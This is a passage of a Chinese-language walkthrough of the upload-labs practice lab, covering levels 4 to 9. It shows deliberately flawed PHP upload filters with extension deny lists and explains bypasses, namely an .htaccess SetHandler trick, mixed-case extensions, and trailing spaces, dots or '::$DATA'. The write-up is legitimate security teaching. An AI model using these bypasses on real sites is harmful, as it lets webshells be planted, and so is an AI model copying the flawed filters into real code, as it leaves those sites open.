class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们先上传一个.htaccess的文件里面内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><p>意思就是把本目录下的jpeg文件当做php来解析</p><p>所以接下来就继续上传一个jpeg木马就可以了。</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p><em><strong>.htaccess</strong></em></p><p>.htaccess文件提供了一种目录级别的修改配置的方式。一个文件，包含一条或多条配置指令，放置于目录下，这些配置指令对当前目录和其所有子目录生效。</p><p>上传的.htaccess文件内容可以这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;你下个上传的文件名&quot;&gt;   SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt;</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><hr><h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><h2 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h2><p>查看提示</p><p><img src="/2021/03/04/upload-labs-wp/11.jpg"></p><p>提示比less-4要多过滤了.htaccass后缀，这里上传用less-4的方法行不通了。查看源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由源码可知，这里不同于less-4，没有大写过滤，所以可以用大写绕过。</p><p>结合过滤发现，没有过滤.PHp后缀，所以可以改成这种后缀上传。</p><p><img src="/2021/03/04/upload-labs-wp/13.jpg"></p><p>当然，在比赛中是不能看源码的，所以这里fuzz是最好的选择。</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>一般来说，会过滤一个大写字母，所以fuzz时可以选择有两个大写的字典。</p><hr><h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><h2 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题还是过滤了所有的后缀名，但是与前面题目不同的是这里没有过滤空格，在window下，若文件名空格作为结尾，系统会自动去除空格，这样就绕过了检测。</p><p><img src="/2021/03/04/upload-labs-wp/14.jpg"></p><p>可以看到，上传成功。</p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p><strong>在window下，若文件名以”.”或者空格或者</strong><code>::$DATA</code><strong>作为结尾，系统会自动去除”.”、空格和</strong><code>::$DATA</code><strong>。</strong>所以当没有删除文件名末尾空格、点和**<code>::$DATA</code>**时可以采用此方法绕过。</p><hr><h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><h2 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h2><p>查看源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题同样是过滤了所有的文件名后缀。但与less-6不同的是，这题过滤了空格，但没过滤<code>.</code>，所以可以在文件名末尾加<code>.</code>,绕过过滤。</p><p><img src="/2021/03/04/upload-labs-wp/15.jpg"></p><p>可以看到，这里上传成功。</p><hr><h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><h2 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上两题不同的是这里没有过滤<code>::$DATA</code>字符串。所以这里可以在文件名末尾加上**<code>::$DATA</code>**。</p><p><img src="/2021/03/04/upload-labs-wp/16.jpg"></p><p>这里可以看到上传成功。</p><hr><h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><h2 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 